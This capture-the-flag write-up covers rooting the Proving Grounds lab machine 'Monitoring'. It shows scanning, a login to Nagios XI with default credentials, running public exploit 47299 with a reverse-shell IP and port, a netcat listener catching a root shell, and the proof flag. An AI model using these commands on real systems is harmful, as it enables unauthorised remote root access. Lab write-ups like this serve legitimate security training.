---
layout: default
title: Monitoring
parent: Proving Grounds Play
nav_order: 25
---

# Monitoring

---

## Users and Credentials

- _Users_:
- _Credentials_: nagiosadmin:admin

# Scanning

---

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.136
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 20:51 EDT
Nmap scan report for 192.168.160.136
Host is up (0.080s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_http-title: 400 Bad Request
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.65 seconds

```

# Enumeration

---

## 80 | HTTP

Nagios XI admin login screen.

Authenticated with the default credentials _nagiosadmin:admin_

Nagios XI version _5.6.0_

Searching for exploits there is a Remote Code Execution exploit (EDB-ID 47299)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ searchsploit nagios xi 5.6
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasp | linux/remote/47039.rb
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation        | linux/webapps/46221.py
Nagios XI 5.6.1 - SQL injection                                       | php/webapps/46910.txt
Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution             | php/webapps/48640.txt
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation   | php/webapps/47299.php
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

# Exploit

Download the exploit to our current directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ searchsploit -m 47299
  Exploit: Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation
      URL: https://www.exploit-db.com/exploits/47299
     Path: /usr/share/exploitdb/exploits/php/webapps/47299.php
    Codes: N/A
 Verified: False
File Type: PHP script, Unicode text, UTF-8 text, with very long lines (624)
Copied to: /home/vagrant/Documents/PG/PLAY/monitoring/47299.php
```

Run the exploit using the required parameters and receive an error for _curl_init()_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ php 47299.php --host=192.168.160.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168
.45.217 --reverseport=9001
PHP Fatal error:  Uncaught Error: Call to undefined function curl_init() in /home/vagrant/Documents/PG/P
LAY/monitoring/47299.php:32
Stack trace:
#0 /home/vagrant/Documents/PG/PLAY/monitoring/47299.php(22): extractNSP()
#1 {main}
  thrown in /home/vagrant/Documents/PG/PLAY/monitoring/47299.php on line 32
```

Install _php_curl_

```bash
sudo apt-get install php_curl
```

Now get error for _DOMDocument_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ php 47299.php --host=192.168.160.136/ --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.217 --reverseport=9001
[+] Grabbing NSP from: http://192.168.160.136//nagiosxi/login.php
[+] Retrieved page contents from: http://192.168.160.136//nagiosxi/login.php
PHP Fatal error:  Uncaught Error: Class "DOMDocument" not found in /home/vagrant/Documents/PG/PLAY/monitoring/47299.php:51
Stack trace:
#0 /home/vagrant/Documents/PG/PLAY/monitoring/47299.php(22): extractNSP()
#1 {main}
  thrown in /home/vagrant/Documents/PG/PLAY/monitoring/47299.php on line 51

```

Intall _php_dom_

```bash
sudo apt-get install php_dom
```

Rerun exploit and it executes successfully this time

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ php 47299.php --host=192.168.160.136/ --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.217 --reverseport=9001
[+] Grabbing NSP from: http://192.168.160.136//nagiosxi/login.php
[+] Retrieved page contents from: http://192.168.160.136//nagiosxi/login.php
[+] Extracted NSP - value: 02b0e6c02923a5ff2ba4b5734db35e487b934db47a983bfde7cedab3a00a5029
[+] Attempting to login...
[+] Authentication success
[+] Checking we have admin rights...
[+] Admin access confirmed
[+] Grabbing NSP from: http://192.168.160.136//nagiosxi/admin/monitoringplugins.php
[+] Retrieved page contents from: http://192.168.160.136//nagiosxi/admin/monitoringplugins.php
[+] Extracted NSP - value: 2a93ab6f82aab549a4c9ae428390f29b57de6dd55cd8c849d24e968495910873
[+] Uploading payload...
[+] Payload uploaded
[+] Triggering payload: if successful, a reverse shell will spawn at 192.168.45.217:9001
```

We receive a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/monitoring]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.160.136] 32946
bash: cannot set terminal process group (965): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile#
```

# Post-Exploitation

We have a root shell from our exploit, so no post-exploitation is required for this machine.

```bash
root@ubuntu:~# ifconfig
ifconfig
ens192    Link encap:Ethernet  HWaddr 00:50:56:bf:ec:7a
          inet addr:192.168.160.136  Bcast:192.168.160.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:febf:ec7a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:188359 errors:0 dropped:0 overruns:0 frame:0
          TX packets:183822 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:27804568 (27.8 MB)  TX bytes:60027745 (60.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2725 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2725 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:671397 (671.3 KB)  TX bytes:671397 (671.3 KB)

root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# hostname
hostname
ubuntu
root@ubuntu:~# cat proof.txt
cat proof.txt
e8bde8d403dce1e71833ef08b9884c51
```
